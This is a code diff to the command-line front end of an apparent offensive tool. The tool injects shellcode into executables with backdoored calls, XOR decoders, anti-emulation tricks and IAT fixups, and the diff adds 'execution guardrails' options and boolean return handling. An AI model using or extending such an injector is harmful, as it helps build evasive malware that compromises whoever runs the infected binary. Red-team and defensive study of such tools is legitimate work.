@@ -34,7 +34,10 @@ def main():
     parser.add_argument('--carrier', type=str, help='carrier: data/source/carrier/* (alloc_rw_rx, peb_walk, ...)', default="alloc_rw_rx")
     parser.add_argument('--decoder', type=str, help='decoder: data/source/decoders/* (xor_1, xor_2, plain, ...)', default="xor_2")
     parser.add_argument('--antiemulation', type=str, help='anti-emulation: data/source/antiemulation/* (sirallocalot, timeraw, none, ...)', default="sirallocalot")
-    parser.add_argument('--fix-iat', action='store_true', help='Fix missing IAT entries in the infectable executable', default=True)
+    parser.add_argument('--guardrail', type=str, help='guardrails: Enable execution guardrails', default="none")
+    parser.add_argument('--guardrail-key', type=str, help='guardrails: key', default="")
+    parser.add_argument('--guardrail-value', type=str, help='guardrails: value', default="")
+    parser.add_argument('--no-fix-iat', action='store_true', help='Fix missing IAT entries in the infectable executable', default=False)
     parser.add_argument('--carrier_invoke', type=str, help='how carrier is started: \"backdoor\" to rewrite call instruction, \"eop\" for entry point', choices=["eop", "backdoor"], default="backdoor")
     parser.add_argument('--start', action='store_true', help='Start the infected executable at the end for testing')
     parser.add_argument('--short-call-patching', action='store_true', help='Debug: Make short calls long. You will know when you need it.')
@@ -51,9 +54,22 @@ def main():
     else:
         setup_logging(logging.INFO)
 
-    settings.try_start_final_infected_exe = args.start_injected
+    settings.try_start_final_infected_exe = args.start
     settings.cleanup_files_on_start = not args.no_clean_at_start
     settings.cleanup_files_on_exit =not args.no_clean_at_exit
+
+    settings.fix_missing_iat = not args.no_fix_iat
+    if args.guardrail:
+        settings.plugin_guardrail = args.guardrail
+        settings.plugin_guardrail_data_key = args.guardrail_key
+        settings.plugin_guardrail_data_value = args.guardrail_value
+
+    logger.info("-( Config: Implant IAT fixup if necessary: {}".format(settings.fix_missing_iat))
+    if settings.plugin_guardrail != "none":
+        logger.info("-( Config: Guardrails Plugin: {}  {}/{}".format(
+            settings.plugin_guardrail,
+            settings.plugin_guardrail_data_key,
+            settings.plugin_guardrail_data_value))
 
     # Shellcode: filename
     # Inject: filename
@@ -130,14 +146,14 @@ def sanity_checks(settings):
 
 
 
-def start_real(settings: Settings):
+def start_real(settings: Settings) -> bool:
     """Main entry point for the application. This is where the magic happens (based on settings)"""
 
     # Load our input
     project = Project(settings)
     if not project.init():
         logger.error("Error initializing project")
-        return 1
+        return False
 
     # CHECK if 64 bit
     if not project.injectable.superpe.is_64():
@@ -158,7 +174,7 @@ def start_real(settings: Settings):
         phases.templater.create_c_from_template(settings, len(project.payload.payload_data))
     except FileNotFoundError as e:
         logger.error("Error creating C from template: {}".format(e))
-        return 1
+        return False
 
     # PREPARE DataReuseEntry for usage in Compiler/AsmTextParser
     # So the carrier is able to find the payload
@@ -181,7 +197,7 @@ def start_real(settings: Settings):
                 settings = project.settings)
         except ChildProcessError as e:
             logger.error("Error compiling C to ASM: {}".format(e))
-            return
+            return False
         
     # we have the carrier-required IAT entries in carrier.iat_requests
     # CHECK if all are available in infectable, or abort (early check)
@@ -190,7 +206,8 @@ def start_real(settings: Settings):
         logging.error("IAT entries not found in infectable: {}".format(", ".join(functions)))
         logging.error("The carrier depends on these functions, but they are not available in the infectable exe.")
         logging.error("Use another infectable exe, or update the carrier to not depend on these functions.")
-        raise Exception("Required carrier import not found in infectable: {}".format(", ".join(functions)))
+        logging.error(" or dont use --no-fix-iat")
+        return False
 
     # ASSEMBLE: Assemble .asm to .shc (ASM -> SHC)
     carrier_shellcode: bytes = phases.assembler.asm_to_shellcode(
@@ -226,6 +243,15 @@ def start_real(settings: Settings):
                 logger.warning("Payload exit code: {}".format(payload_exit_code))
         elif settings.try_start_final_infected_exe:
             run_exe(settings.inject_exe_out, dllfunc=settings.dllfunc, check=False)
+
+    if settings.plugin_guardrail != "none":
+        logger.warning("! Remember your guardrails settings when testing")
+        logger.warning("!   {}: {} / {}".format(
+            settings.plugin_guardrail,
+            settings.plugin_guardrail_data_key, 
+            settings.plugin_guardrail_data_value))
+
+    return True
 
 
 def obfuscate_shc_loader(file_shc_in, file_shc_out):
